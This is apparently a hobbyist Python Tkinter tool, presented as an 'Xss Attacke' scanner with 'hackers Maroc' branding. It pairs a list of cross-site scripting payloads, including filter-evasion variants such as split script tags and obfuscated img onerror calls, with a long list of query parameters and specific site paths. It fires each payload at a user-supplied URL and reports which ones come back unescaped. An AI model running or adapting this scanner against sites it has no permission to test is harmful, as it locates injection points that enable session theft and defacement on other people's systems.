#! /usr/bin/env python
# Coded By Said Ayady

import sys
import tkinter.scrolledtext as sc
import time
from requests import *
from bs4 import BeautifulSoup
import urllib
import urllib.request
import threading
try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk

try:
    import ttk
    py3 = False
except ImportError:
    import tkinter.ttk as ttk
    py3 = True

import XssSpayder_support
paylodXss = ['<script>alert(1)</script>',
                '<scr<script>ipt>alert(1)</sCRiPt>',
                '"><svg onload=alert`XSS`>',
                '<svg onload=alert(1)>',
                '<input onfocus="alert("xss");" autofocus>',
                '<div/onmouseover="alert(1)""> style="x:">',
                '<h1>Said</h1>',
                '<input id="hacker" >',
                '</script><script>alert("xElkomy")</script>','<b onmouseover=alert("Wufff!")>click me!</b>',
                '/><svg src=x onload=confirm("1337");>',
                '<img src="X" onerror=top[8680439..toString(30)](1337)>',
                '"<img/**/src="x"/**/onx=""/**/onerror="alert`xss`">f9y60',
                '<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(document.domain)</a:script>',
                '<img src=123><img src=123><a href="javascript:alert(1)">xss</a><svg></svg><img src=1>',
                '<body><center><h3>hacker</h3></center></body>',
                '<style>body{background-color: black;}</style>',
                '<div><span>xsx</span> </div>',
                'said hacker maroc']

xssd = ['?sa=','?cat=',
            '?q=',
            '?search=',
            '?s=',
            '?id=',
            '?lang=',
            '?keywords=',
            '?query=',
            '?page=',
            '?keyword=',
            '?year=',
            '?view=',
            '?email=',
            '?type=',
            '?name=',
            '?p=',
            '?month=',
            '?immagine=',
            '?list_type=',
            '?url=',
            '?terms=',
            '?categoryid=',
            '?key=',
            '?l=',
            '?begindate=',
            '?enddate=',
            '?s=',
                'search?q=',
                'index.php?lang=',
                'pplay/info_prenotazioni.asp?immagine=',
                'shared/lgflsearch.php?terms=',
                'index.php?page=',
                'search?query=',
                'en/Telefon-Cam?search=',
                'index.php?bukva=',
                'pro/events_print_setup.cfm?list_type=',
                'pro/events_print_setup.cfm?categoryid=',
                'pro/events_print_setup.cfm?categoryid2=',
                '?eventSearch=',
                '?startTime=',
                'pro/events_ical.cfm?categoryids=',
                'pro/events_ical.cfm?categoryids2=',
                'pro/events_print_setup.cfm?month=',
                'pro/events_print_setup.cfm?year=',
                'pro/events_print_setup.cfm?begindate=',
                'pro/events_print_setup.cfm?enddate=',
                'search?keyword=',
                '?q=',
                'search/?q=',
                'index.php?pn=',
                '?lang=',
                'property/search?uid=',
                'index.php?id=',
                'search?orgId=',
                'products?handler=',
                'pro/events_print_setup.cfm?view=',
                'pro/events_print_setup.cfm?keywords=',
                '?p=',
                'search.php?q=',
                'search/?p=',
                '?search=',
                'pro/minicalendar_detail.cfm?list_type=',
                'index.php?produkti_po_cena=',
                'index.php?produkti_po_ime=',
                'servlet/com.jsbsoft.jtf.core.SG?CODE=',
                'login?redirect_uri=',
                'connexion?redirect_uri=',
                'index.php?action=',
                'plugins/actu/listing_actus-front.php?id_site=',
                'index.php?mebel_id=',
                'search/?search=',
                'news/class/index.php?myshownums=',
                'news/class/index.php?myord=',
                'search.html?searchScope=',
                'search?field%5B%5D=',
                'videos?tag=',
                'videos?place=',
                'videos?search=',
                '?email=',
                '?cat=',
                'content.php?expand=',
                '?page=',
                'search/?s=',
                '?keywords=',
                'search/?keyword=',
                'apps/email/index.jsp?n=',
                '?name=',
                '?sort=',
                'search?search=',
                'pro/minicalendar_print_setup.cfm?begindate=',
                'pro/minicalendar_print_setup.cfm?enddate=',
                'pro/minicalendar_print_setup.cfm?keywords=',
                'search-results?q=',
                '?listingtypeid=',
                'search?s=',
                'pro/minicalendar_print_setup.cfm?categoryid2=',
                '?bathrooms=',
                '?listingagent=',
                '?featuredsearchseourl=',
                '?squarefeet=',
                '?siteid=',
                '?bedrooms=',
                '?featuredsearch=',
                '?price=',
                '?maxbuilt=',
                '?lsid=',
                '?listingtypes=',
                '?garages=',
                '?maxprice=',
                '?minprice=',
                '?keywordsany=',
                '?yearbuilt=',
                '?minbuilt=',
                '?subdivision=',
                '?lotsizeval=',
                '?listingstatusid=',
                '?mls=',
                'firms/?text=',
                'servlet/com.jsbsoft.jtf.core.SG?OBJET=',
                'plan_du_site.php?lang=',
                'index.php?Itemid=',
                '?view=',
                '?t=',
                'search/?t=',
                '?selat=',
                '?selong=',
                '?nwlat=',
                '?geo=',]


def vp_start_gui():
    '''Starting point when module is the main routine.'''
    global val, w, root
    root = tk.Tk()
    top = Toplevel1 (root)
    XssSpayder_support.init(root, top)
    root.mainloop()

w = None
def create_Toplevel1(rt, *args, **kwargs):
    '''Starting point when module is imported by another module.
       Correct form of call: 'create_Toplevel1(root, *args, **kwargs)' .'''
    global w, w_win, root
    #rt = root
    root = rt
    w = tk.Toplevel (root)
    top = Toplevel1 (w)
    XssSpayder_support.init(w, top, *args, **kwargs)
    return (w, top)

def destroy_Toplevel1():
    global w
    w.destroy()
    w = None

class Toplevel1:
    def __init__(self, top=None):
        '''This class configures and populates the toplevel window.
           top is the toplevel containing window.'''
        _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
        _fgcolor = '#000000'  # X11 color: 'black'
        _compcolor = '#d9d9d9' # X11 color: 'gray85'
        _ana1color = '#d9d9d9' # X11 color: 'gray85'
        _ana2color = '#ececec' # Closest X11 color: 'gray92'

        top.geometry("833x503+289+109")
        top.minsize(120, 1)
        top.maxsize(1370, 749)
        top.resizable(1,  1)
        top.title("Scaner Xss Attacke 💘")
        top.configure(background="#d9d9d9")

        self.Label1 = tk.Label(top)
        self.Label1.place(relx=0.0, rely=0.0, height=41, width=834)
        self.Label1.configure(background="white")
        self.Label1.configure(disabledforeground="#a3a3a3")
        self.Label1.configure(foreground="red")
        self.Label1.configure(text='''Coded By Said Ayady 😎''',font='-family {Showcard Gothic} -size 20 -weight bold')

        self.Frame1 = tk.Frame(top)
        self.Frame1.place(relx=0.0, rely=0.855, relheight=0.149, relwidth=1.002)
        self.Frame1.configure(relief='groove')
        self.Frame1.configure(borderwidth="2")
        self.Frame1.configure(relief="groove")
        self.Frame1.configure(background="white")

        self.Label2 = tk.Label(self.Frame1)
        self.Label2.place(relx=0.778, rely=0.133, height=51, width=182)
        self.Label2.configure(background="white")
        self.Label2.configure(disabledforeground="#a3a3a3")
        self.Label2.configure(foreground="#000000")
        self.Label2.configure(text='''My Accounts ☢''',font='-family {Showcard Gothic} -size 14 -weight bold')

        self.Button1 = tk.Button(self.Frame1)
        self.Button1.place(relx=0.012, rely=0.267, height=34, width=107)
        self.Button1.configure(activebackground="#ececec")
        self.Button1.configure(activeforeground="#000000")
        self.Button1.configure(background="blue")
        self.Button1.configure(disabledforeground="#a3a3a3")
        self.Button1.configure(foreground="white")
        self.Button1.configure(highlightbackground="#d9d9d9")
        self.Button1.configure(highlightcolor="black")
        self.Button1.configure(pady="0")
        self.Button1.configure(text='''Facebook''',font="-family {Book Antiqua} -size 14 -weight bold -slant italic")
#italic
        self.Button1_1 = tk.Button(self.Frame1)
        self.Button1_1.place(relx=0.156, rely=0.267, height=34, width=107)
        self.Button1_1.configure(activebackground="#ececec")
        self.Button1_1.configure(activeforeground="#000000")
        self.Button1_1.configure(background="pink")
        self.Button1_1.configure(disabledforeground="#a3a3a3")
        self.Button1_1.configure(foreground="white")
        self.Button1_1.configure(highlightbackground="#d9d9d9")
        self.Button1_1.configure(highlightcolor="black")
        self.Button1_1.configure(pady="0")
        self.Button1_1.configure(text='''Instagram''',font="-family {Book Antiqua} -size 14 -weight bold -slant italic")

        self.Button1_2 = tk.Button(self.Frame1)
        self.Button1_2.place(relx=0.299, rely=0.267, height=34, width=107)
        self.Button1_2.configure(activebackground="#ececec")
        self.Button1_2.configure(activeforeground="#000000")
        self.Button1_2.configure(background="green")
        self.Button1_2.configure(disabledforeground="#a3a3a3")
        self.Button1_2.configure(foreground="white")
        self.Button1_2.configure(highlightbackground="#d9d9d9")
        self.Button1_2.configure(highlightcolor="black")
        self.Button1_2.configure(pady="0")
        self.Button1_2.configure(text='''WhatsApp''',font="-family {Book Antiqua} -size 14 -weight bold -slant italic")

        self.Button1_3 = tk.Button(self.Frame1)
        self.Button1_3.place(relx=0.443, rely=0.267, height=34, width=107)
        self.Button1_3.configure(activebackground="#ececec")
        self.Button1_3.configure(activeforeground="#000000")
        self.Button1_3.configure(background="red")
        self.Button1_3.configure(disabledforeground="#a3a3a3")
        self.Button1_3.configure(foreground="white")
        self.Button1_3.configure(highlightbackground="#d9d9d9")
        self.Button1_3.configure(highlightcolor="black")
        self.Button1_3.configure(pady="0")
        self.Button1_3.configure(text='''Email''',font="-family {Book Antiqua} -size 14 -weight bold -slant italic")

        self.Button1_4 = tk.Button(self.Frame1)
        self.Button1_4.place(relx=0.587, rely=0.267, height=34, width=107)
        self.Button1_4.configure(activebackground="#ececec")
        self.Button1_4.configure(activeforeground="#000000")
        self.Button1_4.configure(background="black")
        self.Button1_4.configure(disabledforeground="#a3a3a3")
        self.Button1_4.configure(foreground="white")
        self.Button1_4.configure(highlightbackground="#d9d9d9")
        self.Button1_4.configure(highlightcolor="black")
        self.Button1_4.configure(pady="0")
        self.Button1_4.configure(text='''GitHup''',font="-family {Book Antiqua} -size 14 -weight bold -slant italic")

        self.Frame2 = tk.Frame(top)
        self.Frame2.place(relx=0.0, rely=0.08, relheight=0.109, relwidth=1.002)
        self.Frame2.configure(relief='groove')
        self.Frame2.configure(borderwidth="2")
        self.Frame2.configure(relief="groove")
        self.Frame2.configure(background="#d9d9d9")

        self.Entry1 = tk.Entry(self.Frame2)
        self.Entry1.place(relx=0.443, rely=0.182, height=30, relwidth=0.34)
        self.Entry1.configure(background="white")
        self.Entry1.configure(disabledforeground="#a3a3a3")
        self.Entry1.configure(font="TkFixedFont")
        self.Entry1.configure(foreground="#000000")
        self.Entry1.configure(insertbackground="black")

        self.Button2 = tk.Button(self.Frame2)
        self.Button2.place(relx=0.012, rely=0.182, height=34, width=157)
        self.Button2.configure(activebackground="#ececec")
        self.Button2.configure(activeforeground="#000000")
        self.Button2.configure(background="red")
        self.Button2.configure(disabledforeground="#a3a3a3")
        self.Button2.configure(foreground="white")
        self.Button2.configure(highlightbackground="#d9d9d9")
        self.Button2.configure(highlightcolor="black")
        self.Button2.configure(pady="0")
        self.Button2.configure(text='''Stop Scane''',font="-family {Book Antiqua} -size 16 -weight bold -slant italic")

        self.Button2_1 = tk.Button(self.Frame2)
        self.Button2_1.place(relx=0.216, rely=0.182, height=34, width=157)
        self.Button2_1.configure(activebackground="#ececec")
        self.Button2_1.configure(activeforeground="#000000")
        self.Button2_1.configure(background="green")
        self.Button2_1.configure(disabledforeground="#a3a3a3")
        self.Button2_1.configure(foreground="White")
        self.Button2_1.configure(highlightbackground="#d9d9d9")
        self.Button2_1.configure(highlightcolor="black")
        self.Button2_1.configure(pady="0")
        self.Button2_1.configure(text='''Start Scane''',font="-family {Book Antiqua} -size 16 -weight bold -slant italic")

        self.Label3 = tk.Label(self.Frame2)
        self.Label3.place(relx=0.802, rely=0.182, height=31, width=153)
        self.Label3.configure(background="#d9d9d9")
        self.Label3.configure(disabledforeground="#a3a3a3")
        self.Label3.configure(foreground="#000000")
        self.Label3.configure(text=''' : الرابط''',font="-family {Showcard Gothic} -size 20 -weight bold")

        self.Frame3 = tk.Frame(top)
        self.Frame3.place(relx=0.0, rely=0.199, relheight=0.646, relwidth=1.002)
        self.Frame3.configure(relief='groove')
        self.Frame3.configure(borderwidth="2")
        self.Frame3.configure(relief="groove")
        self.Frame3.configure(background="#d9d9d9")

        scrol = sc.ScrolledText(self.Frame3,background='white')
        scrol.place(x=0,y=0, height=320 , relwidth=1.002)
        scrol.tag_config('green',background='green',font='-family {Showcard Gothic} -size 13 -weight bold',foreground='white')
        scrol.tag_config('red',font='-family {Showcard Gothic} -size 13 -weight bold',foreground='red')
        scrol.tag_config('greenLG',background='green',foreground='white')
        scrol.tag_config('redLG',background='red',foreground='white')
        #,background='red'
        scrol.tag_config('blue',background='blue',foreground='white',font='-family {Showcard Gothic} -size 14 -weight bold')
        scrol.tag_config('txtx',font='-family {Book Antiqua} -size 14 -weight bold -slant italic',foreground='black')
        #txt.insert('end','ismodcwie','color')
        
        def scan(): 
            scrol.insert('end', '                      ------------------------------------------------------------- \n','greenLG')
            scrol.insert('end', '                     | hh    hh   aaaa   cccccccc kk   kk rrrrrrrr   ssssssssssssss | \n','redLG')
            scrol.insert('end', '                     | hh    hh  aa  aa  cc       kk  kk  rr     rr ss              | \n','redLG')
            scrol.insert('end', '                     | hhhhhhhh aa    aa cc       kkkk    rrrrrrrr  ss        Maroc | \n','redLG')
            scrol.insert('end', '                     | hhhhhhhh aaaaaaaa cc       kkkk    rr  rr     ssssss         | \n','redLG')
            scrol.insert('end', '                     | hh    hh aa    aa cc       kk  kk  rr   rr         ss        | \n','redLG')
            scrol.insert('end', '                     | hh    hh aa    aa cccccccc kk   kk rr    rr  sssssss         | \n','redLG')
            scrol.insert('end', '                      -------------------------------------------------------------  \n','greenLG')
            scrol.insert('end', '\n')
            link = self.Entry1.get()
            for i in xssd:
                chek = f'{link}{i}'
                #print(chek)
                req = get(chek)
                if req.status_code == 200 :
                    scrol.insert('end', f'➡ Link File Is True : ','blue')
                    scrol.insert('end', f' {chek} \n ','txtx')
                    for payX in range(len(paylodXss)):
                        url = f"{chek}{paylodXss[payX]}"
                        op = get(url)
                        if paylodXss[payX] in op.text:
                            scrol.insert('end', '\n')
                            scrol.insert('end', f'   ✔ Paylod Is True : ','green')
                            scrol.insert('end', f' {paylodXss[payX]} \n ','txtx')
                        else:
                            scrol.insert('end', '\n')
                            scrol.insert('end', f'   ❌ Paylod Is Folse : ','red')
                            scrol.insert('end', f' {paylodXss[payX]} \n ','txtx')
                            continue
                else:
                    continue
                scrol.insert('end', '\n')

        def go():
            threading.Thread(target=scan).start()
        def clc():
            exit()
        def cl():
            threading.Thread(target=clc).start()
        self.Button2.configure(command=cl)
        self.Button2_1.configure(command=go)
if __name__ == '__main__':
    vp_start_gui()





